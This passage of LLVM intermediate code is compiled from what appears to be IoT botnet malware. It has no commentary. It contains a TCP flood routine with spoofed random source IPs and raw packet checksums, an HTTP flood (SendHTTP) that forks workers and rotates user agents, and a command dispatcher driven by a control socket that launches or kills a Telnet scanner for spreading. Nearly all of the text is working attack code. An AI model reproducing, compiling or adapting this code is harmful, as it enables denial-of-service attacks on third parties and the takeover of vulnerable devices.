  %98 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %97, i32 0, i32 0
  %99 = bitcast %union.anon* %98 to %struct.anon.0*
  %100 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %99, i32 0, i32 2
  store i32 %96, i32* %100, align 4
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 3
  store i32 0, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon* %106 to %struct.anon.0*
  %108 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = and i16 %109, -241
  %111 = or i16 %110, 80
  store i16 %111, i16* %108, align 4
  %112 = load i8*, i8** %11, align 8
  %113 = call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.538, i32 0, i32 0)) #9
  %114 = icmp ne i32 %113, 0
  br i1 %114, label %151, label %115

; <label>:115:                                    ; preds = %68
  %116 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon* %117 to %struct.anon.0*
  %119 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -513
  %122 = or i16 %121, 512
  store i16 %122, i16* %119, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon* %124 to %struct.anon.0*
  %126 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %125, i32 0, i32 4
  %127 = load i16, i16* %126, align 4
  %128 = and i16 %127, -1025
  %129 = or i16 %128, 1024
  store i16 %129, i16* %126, align 4
  %130 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %131 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %130, i32 0, i32 0
  %132 = bitcast %union.anon* %131 to %struct.anon.0*
  %133 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %132, i32 0, i32 4
  %134 = load i16, i16* %133, align 4
  %135 = and i16 %134, -257
  %136 = or i16 %135, 256
  store i16 %136, i16* %133, align 4
  %137 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %138 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %137, i32 0, i32 0
  %139 = bitcast %union.anon* %138 to %struct.anon.0*
  %140 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %139, i32 0, i32 4
  %141 = load i16, i16* %140, align 4
  %142 = and i16 %141, -4097
  %143 = or i16 %142, 4096
  store i16 %143, i16* %140, align 4
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon* %145 to %struct.anon.0*
  %147 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %146, i32 0, i32 4
  %148 = load i16, i16* %147, align 4
  %149 = and i16 %148, -2049
  %150 = or i16 %149, 2048
  store i16 %150, i16* %147, align 4
  br label %225

; <label>:151:                                    ; preds = %68
  %152 = load i8*, i8** %11, align 8
  %153 = call i8* @strtok(i8* %152, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.539, i32 0, i32 0)) #5
  store i8* %153, i8** %23, align 8
  br label %154

; <label>:154:                                    ; preds = %222, %151
  %155 = load i8*, i8** %23, align 8
  %156 = icmp ne i8* %155, null
  br i1 %156, label %157, label %224

; <label>:157:                                    ; preds = %154
  %158 = load i8*, i8** %23, align 8
  %159 = call i32 @strcmp(i8* %158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.540, i32 0, i32 0)) #9
  %160 = icmp ne i32 %159, 0
  br i1 %160, label %169, label %161

; <label>:161:                                    ; preds = %157
  %162 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %163 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %162, i32 0, i32 0
  %164 = bitcast %union.anon* %163 to %struct.anon.0*
  %165 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %164, i32 0, i32 4
  %166 = load i16, i16* %165, align 4
  %167 = and i16 %166, -513
  %168 = or i16 %167, 512
  store i16 %168, i16* %165, align 4
  br label %222

; <label>:169:                                    ; preds = %157
  %170 = load i8*, i8** %23, align 8
  %171 = call i32 @strcmp(i8* %170, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.541, i32 0, i32 0)) #9
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %181, label %173

; <label>:173:                                    ; preds = %169
  %174 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %175 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %174, i32 0, i32 0
  %176 = bitcast %union.anon* %175 to %struct.anon.0*
  %177 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %176, i32 0, i32 4
  %178 = load i16, i16* %177, align 4
  %179 = and i16 %178, -1025
  %180 = or i16 %179, 1024
  store i16 %180, i16* %177, align 4
  br label %221

; <label>:181:                                    ; preds = %169
  %182 = load i8*, i8** %23, align 8
  %183 = call i32 @strcmp(i8* %182, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.542, i32 0, i32 0)) #9
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %193, label %185

; <label>:185:                                    ; preds = %181
  %186 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %186, i32 0, i32 0
  %188 = bitcast %union.anon* %187 to %struct.anon.0*
  %189 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %188, i32 0, i32 4
  %190 = load i16, i16* %189, align 4
  %191 = and i16 %190, -257
  %192 = or i16 %191, 256
  store i16 %192, i16* %189, align 4
  br label %220

; <label>:193:                                    ; preds = %181
  %194 = load i8*, i8** %23, align 8
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.543, i32 0, i32 0)) #9
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %205, label %197

; <label>:197:                                    ; preds = %193
  %198 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon* %199 to %struct.anon.0*
  %201 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -4097
  %204 = or i16 %203, 4096
  store i16 %204, i16* %201, align 4
  br label %219

; <label>:205:                                    ; preds = %193
  %206 = load i8*, i8** %23, align 8
  %207 = call i32 @strcmp(i8* %206, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.544, i32 0, i32 0)) #9
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %217, label %209

; <label>:209:                                    ; preds = %205
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon* %211 to %struct.anon.0*
  %213 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -2049
  %216 = or i16 %215, 2048
  store i16 %216, i16* %213, align 4
  br label %218

; <label>:217:                                    ; preds = %205
  br label %218

; <label>:218:                                    ; preds = %217, %209
  br label %219

; <label>:219:                                    ; preds = %218, %197
  br label %220

; <label>:220:                                    ; preds = %219, %185
  br label %221

; <label>:221:                                    ; preds = %220, %173
  br label %222

; <label>:222:                                    ; preds = %221, %161
  %223 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %223, i8** %23, align 8
  br label %154

; <label>:224:                                    ; preds = %154
  br label %225

; <label>:225:                                    ; preds = %224, %115
  %226 = call i32 @rand_cmwc()
  %227 = trunc i32 %226 to i16
  %228 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = bitcast %union.anon* %229 to %struct.anon.0*
  %231 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %230, i32 0, i32 5
  store i16 %227, i16* %231, align 2
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon* %233 to %struct.anon.0*
  %235 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %234, i32 0, i32 6
  store i16 0, i16* %235, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon* %237 to %struct.anon.0*
  %239 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load i32, i32* %9, align 4
  %241 = icmp eq i32 %240, 0
  br i1 %241, label %242, label %244

; <label>:242:                                    ; preds = %225
  %243 = call i32 @rand_cmwc()
  br label %249

; <label>:244:                                    ; preds = %225
  %245 = load i32, i32* %9, align 4
  %246 = trunc i32 %245 to i16
  %247 = call zeroext i16 @htons(i16 zeroext %246) #10
  %248 = zext i16 %247 to i32
  br label %249

; <label>:249:                                    ; preds = %244, %242
  %250 = phi i32 [ %243, %242 ], [ %248, %244 ]
  %251 = trunc i32 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 1
  store i16 %251, i16* %255, align 2
  %256 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %258 = call zeroext i16 @tcpcsum(%struct.iphdr* %256, %struct.tcphdr* %257)
  %259 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 0
  %261 = bitcast %union.anon* %260 to %struct.anon.0*
  %262 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %261, i32 0, i32 6
  store i16 %258, i16* %262, align 4
  %263 = bitcast i8* %73 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = call i64 @time(i64* null) #5
  %272 = load i32, i32* %10, align 4
  %273 = sext i32 %272 to i64
  %274 = add nsw i64 %271, %273
  %275 = trunc i64 %274 to i32
  store i32 %275, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %276

; <label>:276:                                    ; preds = %330, %329, %249
  br label %277

; <label>:277:                                    ; preds = %276
  %278 = load i32, i32* %17, align 4
  %279 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %280 = call i64 @sendto(i32 %278, i8* %73, i64 %71, i32 0, %struct.sockaddr* %279, i32 16)
  %281 = load i32, i32* %19, align 4
  %282 = call i32 @getRandomIP(i32 %281)
  %283 = call i32 @htonl(i32 %282) #10
  %284 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 8
  store i32 %283, i32* %285, align 4
  %286 = call i32 @rand_cmwc()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  %290 = call i32 @rand_cmwc()
  %291 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 0
  %293 = bitcast %union.anon* %292 to %struct.anon.0*
  %294 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %293, i32 0, i32 2
  store i32 %290, i32* %294, align 4
  %295 = call i32 @rand_cmwc()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %298 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %297, i32 0, i32 0
  %299 = bitcast %union.anon* %298 to %struct.anon.0*
  %300 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %299, i32 0, i32 0
  store i16 %296, i16* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon* %302 to %struct.anon.0*
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 6
  store i16 0, i16* %304, align 4
  %305 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = call zeroext i16 @tcpcsum(%struct.iphdr* %305, %struct.tcphdr* %306)
  %308 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %309 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %308, i32 0, i32 0
  %310 = bitcast %union.anon* %309 to %struct.anon.0*
  %311 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %310, i32 0, i32 6
  store i16 %307, i16* %311, align 4
  %312 = bitcast i8* %73 to i16*
  %313 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i32 0, i32 2
  %315 = load i16, i16* %314, align 2
  %316 = zext i16 %315 to i32
  %317 = call zeroext i16 @csum(i16* %312, i32 %316)
  %318 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %319 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %318, i32 0, i32 7
  store i16 %317, i16* %319, align 2
  %320 = load i32, i32* %25, align 4
  %321 = load i32, i32* %15, align 4
  %322 = icmp eq i32 %320, %321
  br i1 %322, label %323, label %330

; <label>:323:                                    ; preds = %277
  %324 = call i64 @time(i64* null) #5
  %325 = load i32, i32* %24, align 4
  %326 = sext i32 %325 to i64
  %327 = icmp sgt i64 %324, %326
  br i1 %327, label %328, label %329

; <label>:328:                                    ; preds = %323
  br label %333

; <label>:329:                                    ; preds = %323
  store i32 0, i32* %25, align 4
  br label %276

; <label>:330:                                    ; preds = %277
  %331 = load i32, i32* %25, align 4
  %332 = add i32 %331, 1
  store i32 %332, i32* %25, align 4
  br label %276

; <label>:333:                                    ; preds = %328
  %334 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %334)
  br label %335

; <label>:335:                                    ; preds = %333, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

; <label>:24:                                     ; preds = %67, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %70

; <label>:28:                                     ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #5
  %34 = srem i32 %33, 59
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* %29, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.546, i32 0, i32 0), i8* %30, i8* %31, i8* %32, i8* %37) #5
  %39 = call i32 @fork() #5
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %66

; <label>:41:                                     ; preds = %28
  br label %42

; <label>:42:                                     ; preds = %64, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* null) #5
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* %48, i16 zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

; <label>:53:                                     ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = call i64 @strlen(i8* %56) #9
  %58 = call i64 @write(i32 %54, i8* %55, i64 %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %61 = call i64 @read(i32 %59, i8* %60, i64 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 %62)
  br label %64

; <label>:64:                                     ; preds = %53, %47
  br label %42

; <label>:65:                                     ; preds = %42
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %28
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %24

; <label>:70:                                     ; preds = %24
  ret void
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %2
  br label %617

; <label>:44:                                     ; preds = %2
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.548, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %138, label %50

; <label>:50:                                     ; preds = %44
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %101, label %56

; <label>:56:                                     ; preds = %50
  %57 = call i32 @fork() #5
  store i32 %57, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %58 = call i64 @sysconf(i32 84) #5
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp eq i32 %60, 1
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %56
  store i32 500, i32* %8, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %56
  %64 = load i32, i32* %7, align 4
  %65 = icmp sge i32 %64, 2
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %63
  store i32 1000, i32* %8, align 4
  br label %67

; <label>:67:                                     ; preds = %66, %63
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %617

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %617

; <label>:76:                                     ; preds = %72
  br label %77

; <label>:77:                                     ; preds = %76
  store i32 0, i32* %6, align 4
  br label %78

; <label>:78:                                     ; preds = %97, %77
  %79 = load i32, i32* %6, align 4
  %80 = load i32, i32* %7, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %100

; <label>:82:                                     ; preds = %78
  %83 = call i64 @time(i64* null) #5
  %84 = call i32 @getpid() #5
  %85 = sext i32 %84 to i64
  %86 = xor i64 %83, %85
  %87 = call i32 @getppid() #5
  %88 = sext i32 %87 to i64
  %89 = add nsw i64 %86, %88
  %90 = trunc i64 %89 to i32
  call void @srand(i32 %90) #5
  %91 = call i64 @time(i64* null) #5
  %92 = call i32 @getpid() #5
  %93 = sext i32 %92 to i64
  %94 = xor i64 %91, %93
  %95 = trunc i64 %94 to i32
  call void @init_rand(i32 %95)
  %96 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %96)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %78

; <label>:100:                                    ; preds = %78
  br label %101

; <label>:101:                                    ; preds = %100, %50
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 1
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* %104, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %114, label %107

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* @scanPid, align 4
  %109 = icmp eq i32 %108, 0
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %107
  br label %617

; <label>:111:                                    ; preds = %107
  %112 = load i32, i32* @scanPid, align 4
  %113 = call i32 @kill(i32 %112, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %114

; <label>:114:                                    ; preds = %111, %101
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 1
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @strcmp(i8* %117, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %137, label %120

; <label>:120:                                    ; preds = %114
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 1
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* %123) #9
  store i32 %124, i32* %9, align 4
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @atoi(i8* %127) #9
  store i32 %128, i32* %10, align 4
  %129 = call i32 @listFork()
  %130 = icmp ne i32 %129, 0
  br i1 %130, label %136, label %131

; <label>:131:                                    ; preds = %120
  %132 = load i32, i32* @mainCommSock, align 4
  %133 = call i32 (i32, i8*, ...) @sockprintf(i32 %132, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.552, i32 0, i32 0))
  %134 = load i32, i32* %10, align 4
  %135 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %134, i32 %135)
  call void @_exit(i32 0) #11
  unreachable

; <label>:136:                                    ; preds = %120
  br label %617

; <label>:137:                                    ; preds = %114
  br label %138

; <label>:138:                                    ; preds = %137, %44
  %139 = load i8**, i8*** %4, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 0
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @strcmp(i8* %141, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.553, i32 0, i32 0)) #9
  %143 = icmp ne i32 %142, 0
